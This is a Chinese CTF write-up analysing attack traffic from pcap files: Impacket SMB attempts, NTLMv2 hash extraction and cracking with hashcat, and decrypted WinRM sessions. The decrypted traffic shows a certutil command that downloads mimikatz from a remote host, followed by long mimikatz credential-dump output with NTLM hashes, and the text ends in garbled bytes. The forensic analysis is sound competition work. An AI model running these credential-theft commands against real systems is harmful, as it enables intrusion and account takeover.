---
title: 2026年第9届中国高校智能机器人创意大赛软件系统安全赛 流量题wp
url: https://mp.weixin.qq.com/s/iXR_ndB_wbYdE2FHxzFtgg
source: Doonsec's feed
date: 2026-04-23
fetch_date: 2026-04-24T04:48:56.812150
---

# 2026年第9届中国高校智能机器人创意大赛软件系统安全赛 流量题wp

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/mFCErZsUXhPPCIeHHUveBPHbg9rS0FDlSOnhEnMkXqOeqLicQwg9tKicBThEnSjbexJib5aPIyvOoFJoNknle6L1IicAkHfE9ZZI2ygfGk9qG7I/0?wx_fmt=jpeg)

# 2026年第9届中国高校智能机器人创意大赛软件系统安全赛 流量题wp

原创

XYY
XYY

天命团队

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

附件给了两个pcapng的文件，一个是pth，另一个是rdp，首先我们先看一下pth的流量。

发现10.10.10.80 → 10.10.10.201:445 大量 SMB Session Setup

用户名为：10.10.10.201\administrator，主机名 JCIFS\_127\_0\_0\_1

Impacket 的 SMB 客户端实现（impacket/smb.py 和 impacket/smb3.py）在构造 NTLM 认证时，默认使用 JCIFS 前缀作为 Workstation Name

后面发现是有一个WinRM认证，在过滤器里面进行过滤

```
http and tcp.port == 5985
```

在数据包详情中展开 HTTP 头：

```
Authorization: Negotiate TlRMTVNTUAAB...
User-Agent: Microsoft WinRM Client
```

`Negotiate` 后面的 Base64 就是 NTLM 认证数据

展开 NTLMSSP 信息：

```
Domain name: pc
User name: administrator
Host name: WEB
```

* 攻击者从 `10.10.10.80`（WEB）通过 WinRM 远程连接到 `10.10.10.201`（PC）
* 使用的是 `pc\administrator` 账号（注意域是 `pc`，不是之前 SMB 的 `10.10.10.201`）
* WinRM 成功后的数据是加密的（`HTTP-SPNEGO-session-encrypted`），后面需要解密

WinRM 通信被NTLMSSP加密，要解密的话，必须知道明文的密码。

NTLM 三步握手

```
客户端 → 服务器：NTLMSSP_NEGOTIATE (Type 1)    "我要认证"
服务器 → 客户端：NTLMSSP_CHALLENGE (Type 2)    "这是挑战码 Challenge"
客户端 → 服务器：NTLMSSP_AUTH (Type 3)         "这是我的应答 Response"
```

我们需要从 Type 2 和 Type 3 中提取数据来组装可破解的 Hash。

首先我们可以提取challenge，在`frame.number == 26`的数据包中展开到NTLMSSP，找到

```
NTLM Server Challenge: aa9355d95d697223
```

在`frame.number == 28`展开找到 Response

```
Domain name: 10.10.10.201
User name:   administrator
NTProofStr:  0b0108720092c6afa059d78cfbf188c7
```

然后复制整个字段得到完整的NTLMv2 Response

```
0b0108720092c6afa059d78cfbf188c70101000000000000f0095026bc72dc01
00000000000000000000000002000a004400450031004100590001000400500043
0004001200640065003100610079002e0063006f006d000300180050004300
2e00640065003100610079002e0063006f006d0005001200640065003100
610079002e0063006f006d0007000800ac903717bc72dc010000000000000000
```

组成hashcat格式：

```
用户名::域:ServerChallenge:NTProofStr:NTLMv2Response去掉前32个十六进制字符
```

**hashcat hash**

```
administrator::10.10.10.201:aa9355d95d697223:0b0108720092c6afa059d78cfbf188c7:0101000000000000f0095026bc72dc0100000000000000000000000002000a0044004500310041005900010004005000430004001200640065003100610079002e0063006f006d0003001800500043002e00640065003100610079002e0063006f006d0005001200640065003100610079002e0063006f006d0007000800ac903717bc72dc010000000000000000
```

当然也可以使用NTLMRawUnHide工具直接去提取，如图：

NTLM 认证中，每次认证服务器都会发一个新的随机 Challenge：

* 第 1 次认证：Challenge = aa9355d95d697223 → NTProofStr = 0b010872...
* 第 2 次认证：Challenge = 4d8b7d534b809b8b → NTProofStr = be616619...
* 第 3 次认证：Challenge = xxxxxxxxxxxxxxxx → NTProofStr = yyyyyyyy...

NTLMv2 的计算公式是：

```
NTProofStr = HMAC-MD5(NTLMv2_Hash, ServerChallenge + ClientBlob)
```

Challenge 不同 → 算出来的 NTProofStr 不同 → 最终的 Hash 字符串不同。在本题中由于都是SMB 认证全部失败了，所以并无什么实际作用。

然后用同样的方法去提取 WinRM 认证 Hash 在 frame1273 和 frame 1276

组成**hashcat hash**：

```
administrator::pc:cd0a6722277096c9:3fa965e4d9af9a92bde5cefcdd309acb:010100000000000022a2d32cbc72dc01ff545caf96411c670000000002000a0044004500310041005900010004005000430004001200640065003100610079002e0063006f006d0003001800500043002e00640065003100610079002e0063006f006d0005001200640065003100610079002e0063006f006d000700080022a2d32cbc72dc010600040002000000080030003000000000000000000000000030000026544cc05c735b21ae876ab6adeaf35030fb649315896d1d685326c99ddb5f6b0a001000000000000000000000000000000000000900220048005400540050002f00310030002e00310030002e00310030002e00320030003100000000000000000000000000
```

然后用hashcat破解即可：`pass@word1`

然后wireshark 设置NTLM 密码，即可看到解密之后的流量了

在这里我们可以看到流量已经解密出来了，可以看到执行的命令

```
命令1: whoami

命令2: ipconfig /all

命令3: certutil -urlcache -f http://10.10.10.80:8000/mimikatz.exe mimikatz.exe

命令4: dir

命令5: mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit" > 1.log
```

```
a Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
'#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords full

Authentication Id : 0 ; 918546 (00000000:000e0412)
Session           : RemoteInteractive from 2
User Name         : administrator
Domain            : DE1AY
Logon Server      : DC
Logon Time        : 2025/12/22 4:43:03
SID               : S-1-5-21-2756371121-2868759905-3853650604-500
 msv :
  [00000003] Primary
  * Username : Administrator
  * Domain   : DE1AY
  * LM       : 4885d2c71db12bab1eba5e9d51b4aa9c
  * NTLM     : 3d83254b53697355ef7498b535e7ab29
  * SHA1     : a08ec5f6abc5d3bf6497d3aa3370f6ff37548d0b
 tspkg :
  * Username : Administrator
  * Domain   : DE1AY
  * Password :
 wdigest :
  * Username : Administrator
  * Domain   : DE1AY
  * Password :
 kerberos :
  * Username : administrator
  * Domain   : DE1AY.COM
  * Password :
 ssp :
 credman :

Authentication Id : 0 ; 712045 (00000000:000add6d)
Session           : NetworkCleartext from 0
User Name         : de1ay
Domain            : DE1AY
Logon Server      : DC
Logon Time        : 2025/12/22 4:36:31
SID               : S-1-5-21-2756371121-2868759905-3853650604-1001
 msv :
  [00000003] Primary
  * Username : de1ay
  * Domain   : DE1AY
  * LM       : f67ce55ac831223dc187b8085fe1d9df
  * NTLM     : 161cff084477fe596a5db81874498a24
  * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
 tspkg :
  * Username : de1ay
  * Domain   : DE1AY
  * Password :
 wdigest :
  * Username : de1ay
  * Domain   : DE1AY
  * Password :
 kerberos :
  * Username : de1ay
  * Domain   : DE1AY.COM
  * Password :
 ssp :
 credman :

Authentication Id : 0 ; 709503 (00000000:000ad37f)
Session           : Service from 0
User Name         : sshd_3212
Domain            : VIRTUAL USERS
Logon Server      : (null)
Logon Time        : 2025/12/22 4:36:30
SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-3212
 msv :
  [00000003] Primary
  * Username : PC$
  * Domain   : DE1AY
  * NTLM     : 656ea538d9cf1c85a57bbac5a5020ffd
  * SHA1     : a9cf2cc0fafdb001bd121d53c665340ed208ffc2
 tspkg :
  * Username : PC$
  * Domain   : DE1AY
  * Password : <bR3tZ!fxJng-+pl6IBwqAmR<w0;<Rqq,oS6[tvWN00sa^?tz`a_v:t4b);6yX*a!aUDS#+) % n*,'4:y%:ak'v1w.mpd/^.g&^zvNB;<FhX+-,pxduthU=
 wdigest :
  * Username : PC$
  * Domain   : DE1AY
  * Password : <bR3tZ!fxJng-+pl6IBwqAmR<w0;<Rqq,oS6[tvWN00sa^?tz`a_v:t4b);6yX*a!aUDS#+) % n*,'4:y%:ak'v1w.mpd/^.g&^zvNB;<FhX+-,pxduthU=
 kerberos :
  * Username : PC$
  * Domain   : de1ay.com
  * Password : <bR3tZ!fxJng-+pl6IBwqAmR<w0;<Rqq,oS6[tvWN00sa^?tz`a_v:t4b);6yX*a!aUDS#+) % n*,'4:y%:ak'v1w.mpd/^.g&^zvNB;<FhX+-,pxduthU=
 ssp :
 credman :

Authentication Id : 0 ; 623891 (00000000:00098513)
Session           : NetworkCleartext from 0
User Name         : de1ay
Domain            : DE1AY
Logon Server      : DC
Logon Time        : 2025/12/22 4:28:24
SID               : S-1-5-21-2756371121-2868759905-3853650604-1001
 msv :
  [00000003] Primary
  * Username : de1ay
  * Domain   : DE1AY
  * LM       : f67ce55ac831223dc187b8085fe1d9df
  * NTLM     : 161cff084477fe596a5db81874498a24
  * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
 tspkg :
  * Username : de1ay
  * Domain   : DE1AY
  * Password :
 wdigest :
  * Username : de1ay
  * Domain   : DE1AY
  * Password :
 kerberos :
  * Username : de1ay
  * Domain   : DE1AY.COM
  * Password :
 ssp :
 credman :

Authentication Id : 0 ; 621283 (00000000:00097ae3)
Session           : Service from 0
User Name         : sshd_3568
Domain            : VIRTUAL USERS
Logon Server      : (null)
Logon Time        : 2025/12/22 4:28:15
SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-3568
 msv :
  [0000þ»)JÚÞjjì¥+ky©.jg²×hºÐ¨.f§t.×..ë....:à
À÷o.ãÐ.ôN;.Ð.0003] Primary
  * Username : PC$
  * Domain   : DE1AY
  * NTLM     : 656ea538d9cf1c85a57bbac5a5020ffd
  * SHA1     : a9cf2cc0fafdb001bd121d53c665340ed...